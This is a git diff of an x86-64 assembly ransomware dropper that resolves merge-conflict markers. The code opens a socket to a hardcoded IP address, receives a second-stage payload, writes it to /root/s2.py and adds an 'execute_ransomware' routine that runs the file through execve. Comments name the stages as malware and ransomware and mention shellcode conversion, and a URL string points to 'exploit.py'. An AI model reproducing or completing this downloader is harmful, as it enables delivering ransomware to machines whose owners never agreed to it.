@@ -13,24 +13,24 @@ section .bss
 	port resw 2
 	bytes_read resw 2
 	file_buff resb 8092
-<<<<<<< HEAD
 	stage2_fd resw 1
-=======
 	file_data resb 8092
->>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
 
 section .data
-	file_name db '/root/stage2.mlwr', 0x0 ;null termination is necessary - will solve this later at time of sc conv
+	malware_name db '/root/s2.py', 0x0 ;null termination is necessary - will solve this later at time of sc conv
+	;malware_name db '/root/stage2.rnswr', 0x0 ;null termination is necessary - will solve this later at time of sc conv
 	;file_data db 'Hi I am stage2 malware', 0x0
 	pop_sa istruc sockaddr_in
 		at sockaddr_in.sin_family, dw 2
 		at sockaddr_in.sin_port, dw 0x3905
-		at sockaddr_in.sin_addr, dd 0xa31e5a0a
+		;at sockaddr_in.sin_addr, dd 0x1100007f
+		;at sockaddr_in.sin_addr, dd 0x1505a8c0
+		at sockaddr_in.sin_addr, dd 0x24aa3b0d
+		;at sockaddr_in.sin_addr, dd 0xa31e5a0a
 		at sockaddr_in.sin_zero, dd 0, 0
 	iend
 	sockaddr_in_len	equ $ - pop_sa
 	
-
 section .text
 
 exit_gracefully:
@@ -69,12 +69,11 @@ _connect:
 	syscall
 
 	ret
-<<<<<<< HEAD
 	
 _fops:	
 	xor rax, rax 
         mov rax, 2
-        lea rdi, [file_name]
+        lea rdi, [malware_name] ; this file needs to be created
         mov rsi, 1
         mov rdx, 1
         syscall
@@ -88,8 +87,9 @@ _fops:
         mov rdx, 8092
         syscall
 	
+	jmp execute_ransomware
+	
 	ret
-=======
 
 print_data:
 	mov rax, 1
@@ -97,8 +97,7 @@ print_data:
 	mov rsi, [file_data]
 	mov rdx, 8092
 	syscall
-	call exit_gracefully
->>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
+	;call exit_gracefully
 
 _fcopy:
 	mov rax, 45 ; recvfrom syscall no
@@ -112,7 +111,6 @@ _fcopy:
 	syscall 
 	mov [bytes_read], rax	
 
-<<<<<<< HEAD
 	mov rax, 1
 	mov rdi, 1
 	mov rsi, [file_buff]
@@ -122,12 +120,11 @@ _fcopy:
 	call _fops
 	;loop _fcopy	
 	
-	ret
-=======
+	;ret
 	jmp print_data
+	ret
 
 	loop _fcopy	
->>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2
 
 connect_to_site:
 	
@@ -137,8 +134,15 @@ connect_to_site:
 	;call connect API
 	call _connect
 	call _fcopy 
-
+	;jmp execute_ransomware
 	call exit_gracefully
+
+execute_ransomware:
+        lea rdi, [malware_name] 
+        xor rax, rax 
+        add rax, 59
+        xor rdx, rdx 
+        syscall
 main:
 	call connect_to_site
 	siteurl: db '10.90.30.163/exploit.py', 0xa
